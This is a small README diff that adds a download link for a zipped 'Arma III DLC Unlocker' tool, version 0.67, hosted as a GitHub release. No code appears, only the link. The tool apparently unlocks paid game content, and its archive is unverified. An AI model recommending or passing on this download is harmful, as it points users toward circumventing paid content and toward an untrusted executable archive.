@@ -6,7 +6,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v.0.67 Release]() = `*Tool files & folder*`
+- [💾 v.0.67 Release](https://github.com/Arma-III-DLC-Unlocker/.github/releases/download/v.0.67/arma3-dlc-manager.zip) = `*Tool files & folder*`
 
 ---
 
